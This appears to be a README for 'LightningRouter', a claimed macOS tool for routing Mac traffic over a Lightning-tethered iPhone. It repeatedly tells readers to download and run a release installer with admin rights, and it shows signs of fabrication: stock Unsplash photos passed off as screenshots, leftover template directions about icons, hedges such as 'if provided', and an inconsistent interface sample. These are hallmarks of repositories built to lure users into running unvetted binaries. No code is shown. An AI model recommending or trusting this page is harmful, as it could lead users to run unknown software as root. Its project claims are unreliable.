[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/TockToro/LightningRouter/releases)

# LightningRouter — Use iPhone Internet on Your Mac Efficiently

A small utility that routes a Mac's network traffic over an iPhone connected via Lightning cable. Use your iPhone's mobile data when Wi‑Fi is slow or unavailable. LightningRouter creates a routed network interface and manages DNS and NAT so your Mac uses the iPhone link with no extra hardware.

![iPhone to Mac tethering](https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=1200&q=80)

- ✅ Works with macOS Big Sur, Monterey, Ventura, Sonoma
- ✅ Uses USB/Lightning tethering
- ✅ GUI and CLI modes
- ✅ Small footprint, no heavy drivers

Badges
- [![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/TockToro/LightningRouter/releases)
- ![Platform: macOS](https://img.shields.io/badge/platform-macOS-lightgrey?logo=apple)

Getting the release
- Visit the Releases page and download the installer package for your macOS version: https://github.com/TockToro/LightningRouter/releases
- The file in the release must be downloaded and executed. Look for a .dmg, .pkg, or a signed installer bundle. Run the installer from Finder and follow on‑screen prompts.

Why use LightningRouter? 🚀
- Avoid configuring complex proxies.
- Avoid carrier or router changes.
- Maintain full IPv4/IPv6 routing and DNS while on mobile data.
- Use a wired connection to preserve battery on your MacBook and keep wireless radios off.

How it works (brief, plain)
- The macOS system sees the iPhone as a network interface when tethered over Lightning.
- LightningRouter installs a small routing helper and a user agent.
- The helper sets up a dedicated network service on the Mac and binds a NAT rule to the iPhone interface.
- The app adds DNS forwarding rules so name lookups go through the phone link.
- The GUI provides a toggle. The CLI exposes install, enable, disable, and uninstall commands.

Requirements
- Mac with Thunderbolt/Lightning or USB-C + Lightning cable
- macOS 11.0 (Big Sur) or later
- iPhone with Personal Hotspot enabled
- Local admin privileges to install and apply system network changes

Quick checklist before install
- Enable Personal Hotspot on the iPhone.
- Connect the iPhone to the Mac with a Lightning cable.
- Open System Preferences > Network to confirm the iPhone interface appears as "iPhone USB" or similar.
- Download the latest release from https://github.com/TockToro/LightningRouter/releases and run the installer file included there.

Install (GUI)
1. Download the correct installer .dmg or .pkg from the Releases page at https://github.com/TockToro/LightningRouter/releases.
2. Open the downloaded file in Finder.
3. Drag the app to Applications or double‑click the package installer.
4. If macOS requests permission to modify network settings, allow it.
5. Launch LightningRouter from Applications.

Install (CLI)
- If the release includes a signed binary or installer script, run the installer as admin:
  ```
  sudo installer -pkg /path/to/LightningRouter.pkg -target /
  ```
- If the release packs a binary in a tarball:
  ```
  tar xzf LightningRouter-x.y.z-macos.tar.gz
  sudo cp LightningRouter /usr/local/bin/
  sudo LightningRouter install
  ```

First run
- Launch the app or run `LightningRouter enable` to create the routing rules.
- The app prompts for admin rights to add routes and NAT rules.
- Toggle the switch. The Mac routes traffic over the iPhone USB interface.

CLI reference
- `LightningRouter install` — register system helper and create network service
- `LightningRouter enable` — turn routing on
- `LightningRouter disable` — turn routing off
- `LightningRouter status` — show route status and interface details
- `LightningRouter uninstall` — remove helper and restore prior network state

Sample usage
- Enable:
  ```
  sudo LightningRouter enable
  ```
- Check status:
  ```
  LightningRouter status
  Interface: iPhone USB (en0)
  Routed: yes
  DNS: set to phone DNS
  ```
- Disable:
  ```
  sudo LightningRouter disable
  ```

Permissions and security
- The app requires admin rights to alter network services and system routing. The installer requests these on install.
- The helper runs with limited privileges. It only modifies networking state.
- The app does not collect user data. Telemetry stays off by default. You can verify this in the app preferences.

Troubleshooting 🔧
- iPhone not detected
  - Confirm cable and port. Use an Apple‑certified Lightning cable.
  - Trust the Mac on the iPhone prompt.
  - Check Finder or System Preferences > Network for "iPhone USB".
- Installer fails with a permissions error
  - Reboot and try again. Confirm the user is an admin.
- DNS still uses old server
  - Run `LightningRouter status`. Use `sudo LightningRouter enable` again to reset DNS.
- Slow or intermittent
  - Verify mobile data on the iPhone. Check carrier signal.
  - Disable other network services on the Mac to avoid split routing.

Advanced topics
- Scripting and automation
  - Use the CLI in an automation script. Example cron or launchd job:
    ```
    /usr/local/bin/LightningRouter enable
    ```
  - The service responds to network changes and re‑applies rules on connect.
- Custom DNS
  - Use the app preferences to set a custom upstream DNS. The app forwards queries over the iPhone link.
- Split tunnel
  - Set an allowlist for local addresses to keep some traffic on Ethernet or Wi‑Fi. See the advanced config file at `~/Library/Application Support/LightningRouter/config.json`.

Building from source (if provided)
- Clone repository:
  ```
  git clone https://github.com/TockToro/LightningRouter.git
  cd LightningRouter
  ```
- Build:
  - Use Xcode: open LightningRouter.xcodeproj, set target to macOS 11+, build.
  - Or use `make` if a Makefile exists:
    ```
    make
    sudo make install
    ```
- The release packages include code signing and notarization. For a development build, you may need to adjust entitlements.

Design decisions
- Use wired USB to avoid wireless interference and keep Wi‑Fi radios off.
- Keep helper minimal and focused on routing and NAT.
- Provide both GUI and CLI for different workflows.
- Use standard macOS APIs for network changes to remain compatible with system updates.

FAQ
- Does this use my iPhone battery?
  - The iPhone charges while connected via Lightning in most setups. The Mac uses the phone's data, not its battery as a power source.
- Will carrier tethering limits apply?
  - Yes. Your mobile plan governs tethering limits, caps, and throttle.
- Can I share the Mac link back to other devices?
  - No. LightningRouter routes Mac traffic over the phone. It does not turn the Mac into a hotspot.
- Does it work over wireless Personal Hotspot?
  - This tool focuses on wired USB tethering. Wireless hotspot may work but the app targets the iPhone USB interface for stability.
- Is it safe to leave enabled?
  - Yes. The app only alters routing and DNS. To remove it, run `sudo LightningRouter uninstall`.

Contributing
- Fork the repo, create a branch, implement your change, open a pull request.
- Run tests locally. Include unit tests for helper logic.
- Follow code style in the repo. Keep changes small and focused.

Releases and downloads
- Download and run the installer file from the Releases page: https://github.com/TockToro/LightningRouter/releases
- Each release includes a changelog and platform notes.
- If the page does not show files or a release fails, check the repository Releases tab on GitHub for assets and signed installers.

Legal / License
- Licensed under the MIT License. See LICENSE in the repository.

Assets and images used
- App icon: use an icon that matches macOS style.
- Demo screenshot: show the app toggling the route and the status pane.
- Use standard Unsplash images for marketing screenshots.

Contact
- Open issues on GitHub for bugs or feature requests.
- Use pull requests for code changes.

Credits
- Core network helper based on macOS NetworkExtension patterns and BSD routing primitives.
- GUI built with SwiftUI for a compact and modern interface.

Changelog highlights (recent)
- 1.2.0 — Added custom DNS and split tunnel support.
- 1.1.0 — Added CLI commands and status output.
- 1.0.0 — Initial release with stable routing and GUI toggle.

Screenshots
![App Screenshot](https://images.unsplash.com/photo-1512496015851-a90fb38ba796?auto=format&fit=crop&w=1200&q=80)
![Connection Flow](https://images.unsplash.com/photo-1516574187841-cb9cc2ca948b?auto=format&fit=crop&w=1200&q=80)

License file
- See LICENSE for full terms.

Download link reminder
- Download the installer file from the Releases page and run it: https://github.com/TockToro/LightningRouter/releases